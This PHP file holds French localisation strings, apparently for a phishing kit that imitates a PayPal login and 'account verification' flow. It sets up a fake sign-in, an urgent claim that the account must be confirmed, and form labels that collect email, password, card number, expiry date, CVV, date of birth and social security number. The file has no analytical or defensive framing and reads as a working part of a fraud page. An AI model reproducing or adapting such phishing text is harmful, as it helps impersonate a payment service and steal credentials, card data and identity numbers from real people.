<?php
$aaaaaaaal1 = "Résumé";
$aaaaaaaal2 = "Argent";
$aaaaaaaal3 = "Activité";
$aaaaaaaal4 = "Rapports";
$aaaaaaaal5 = "Outils";
$aaaaaaaal6 = "Plus";
$aaaaaaaal7 = "Se déconnecter";
$aaaaaaaal8 = "Mettre à jour vos informations";
$aaaaaaaal9 = "Réglages du paiements";
$aaaaaaaal10 = "Étape";
$aaaaaaaal11 = "Personnel";
$aaaaaaaal12 = "Carte";
$aaaaaaaal13 = "Paiements";
$aaaaaaaal14 = "Confirmer";
$aaaaaaaal15 = "Suivant";
$aaaaaaaal16 = "précédent";
$aaaaaaaal17 = "Protéger votre argent";
$aaaaaaaal18 = "Chaque transaction est surveillée et fortement gardé derrière notre chiffrement avancé pour aidez vous à prévenir la fraude et le vol d'identité.";
$aaaaaaaal19 = "Cartes de paiement sur Internet";
$aaaaaaaal20 = "PayPaL est la moyen les plus utilisés au paiement en ligne. Accepter les paiements facilement et en toute sécurité.";
$aaaaaaaal35 = "Vous devez confirmer vos informations pour être en mesure de résoudre ce problème et l'accès à votre compte";
$aaaaaaaal38 = "Fermer pour activer votre compte";
$aaaaaaaal34 = "Veuillez vérifier que vous avez saisi correctement votre adresse email et votre mot de passe.";
$aaaaaaaal22 = "Erreur: Connexion ";
$aaaaaaaal21 = "Connexion ";
$aaaaaaaal24 = "Entrez votre email adresse correctement";
$aaaaaaaal26 = "Entrez votre mot de passe correctement";
$aaaaaaaal23 = "Email adresse";
$aaaaaaaal28 = "Vous avez oublié votre adresse email ?";
$aaaaaaaal25 = "Mot de passe";
$aaaaaaaal27 = "Connexion";
$aaaaaaaal29 = "Ouvrir un compte";
$aaaaaaaal33 = "Tous droits réservés.";
$aaaaaaaal30 = "À propos";
$aaaaaaaal37 = "Évaluation";
$aaaaaaaal31 = "Respect de la vie privée";
$aaaaaaaal32 = "Contrats d'utilisation";
$aaaaaaaal39 = "Date de naissance ";
$aaaaaaaal41 = "Pays ";
$aaaaaaaal40 = "N° de téléphone ";
$aaaaaaaal44 = "Nom du titulaire";
$aaaaaaaal43 = "N° de la carte";
$aaaaaaaal45 = "Date d'expiration";
$aaaaaaaal46 = "CVV code";
$aaaaaaaal47 = "Numéro de sécurité sociale";
$aaaaaaaal42 = "Vérification de vos informations...";



?>